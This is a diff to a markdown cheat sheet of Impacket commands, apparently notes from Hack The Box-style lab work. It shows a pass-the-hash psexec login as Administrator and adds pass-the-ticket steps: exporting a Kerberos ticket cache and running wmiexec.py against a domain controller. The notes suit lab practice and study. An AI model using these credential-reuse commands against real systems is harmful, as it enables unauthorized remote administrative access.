@@ -34,6 +34,13 @@ python3 -m install .
 PSexec with hash (port 135 or 445 must be open):
 `impacket-psexec WEB02-POSEIDO/Administrator@172.16.1.11 -hashes :8ab4098640a136722461728dc38faee2
 
+Setting environmental variable so that you can use impacket tools with `-no-pass` and `-k`
+`export KRB5CCNAME=administrator.ccache`
+
+Now you can log in with the Kerberos ticket. 
+```
+/usr/share/doc/python3-impacket/examples/wmiexec.py support.htb/administrator@dc.support.htb -no-pass -k
+```
 ___
 
 ## Resources:
